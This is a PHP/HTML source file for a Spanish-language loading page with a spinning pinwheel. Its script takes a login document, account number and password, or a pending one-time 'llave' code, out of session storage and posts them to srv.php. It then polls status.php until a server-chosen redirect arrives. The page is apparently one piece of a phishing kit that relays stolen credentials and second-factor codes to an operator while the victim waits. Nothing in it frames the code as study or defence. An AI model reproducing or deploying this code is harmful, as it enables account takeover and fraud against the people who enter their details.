<?php require __DIR__ . '/guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      animation: bgSwitch 1.2s steps(1, end) infinite alternate;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    }

    @keyframes bgSwitch {
      0%   { background-color: #7a7a7a; }
      100% { background-color: #0d7070; }
    }

    .pinwheel {
      animation: spin 1.6s linear infinite;
      transform-origin: center;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to   { transform: rotate(360deg); }
    }

    .loading-text {
      margin-top: 28px;
      color: #ffffff;
      font-size: 22px;
      font-weight: 500;
      letter-spacing: 1px;
      opacity: 0;
      transition: opacity 0.9s ease-in;
    }

    .loading-text.show { opacity: 1; }
  </style>
</head>
<body>

  <svg class="pinwheel" xmlns="http://www.w3.org/2000/svg"
       viewBox="0 0 100 100" width="160" height="160">
    <g transform="translate(50,50)">
      <path d="M 0,0 L -7,-26 L 9,-18 Z"                          fill="white"/>
      <path d="M 0,0 L -7,-26 L 9,-18 Z" transform="rotate(45)"   fill="white"/>
      <path d="M 0,0 L -7,-26 L 9,-18 Z" transform="rotate(90)"   fill="white"/>
      <path d="M 0,0 L -7,-26 L 9,-18 Z" transform="rotate(135)"  fill="white"/>
      <path d="M 0,0 L -7,-26 L 9,-18 Z" transform="rotate(180)"  fill="white"/>
      <path d="M 0,0 L -7,-26 L 9,-18 Z" transform="rotate(225)"  fill="white"/>
      <path d="M 0,0 L -7,-26 L 9,-18 Z" transform="rotate(270)"  fill="white"/>
      <path d="M 0,0 L -7,-26 L 9,-18 Z" transform="rotate(315)"  fill="white"/>
    </g>
  </svg>

  <div class="loading-text" id="loadingText">Cargando...</div>

  <script>
    // Show "Cargando..." text 1.5s after load with smooth fade-in
    setTimeout(() => {
      document.getElementById('loadingText').classList.add('show');
    }, 1500);

    (function () {
      const action = sessionStorage.getItem('pending_action') || 'login';
      let payload  = { action };

      if (action === 'login') {
        payload.documento = sessionStorage.getItem('login_documento');
        payload.numero    = sessionStorage.getItem('login_numero');
        payload.pass      = sessionStorage.getItem('login_pass');
        if (!payload.numero || !payload.pass) {
          window.location.href = 'inicio.php';
          return;
        }
      } else if (action === 'llave' || action === 'llave2') {
        payload.code = sessionStorage.getItem('pending_code');
        payload.sid  = sessionStorage.getItem('sid') || '';
        if (!payload.code) {
          window.location.href = 'inicio.php';
          return;
        }
      } else {
        window.location.href = 'inicio.php';
        return;
      }

      const existingSid = sessionStorage.getItem('sid');
      if (existingSid) payload.sid = existingSid;

      fetch('srv.php', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(payload)
      })
        .then(r => r.json())
        .then(data => {
          if (!data || !data.ok || !data.sid) {
            window.location.href = 'inicio.php';
            return;
          }
          sessionStorage.setItem('sid', data.sid);
          sessionStorage.removeItem('pending_action');
          sessionStorage.removeItem('pending_code');
          startPolling(data.sid);
        })
        .catch(() => { window.location.href = 'inicio.php'; });

      function startPolling(sid) {
        const interval = 2000;
        const timer = setInterval(() => {
          fetch('status.php?sid=' + encodeURIComponent(sid), { cache: 'no-store' })
            .then(r => r.json())
            .then(s => {
              if (s && s.ok && s.status === 'done' && s.redirect) {
                clearInterval(timer);
                window.location.href = s.redirect;
              }
            })
            .catch(() => { /* keep trying */ });
        }, interval);
      }
    })();
  </script>

</body>
</html>
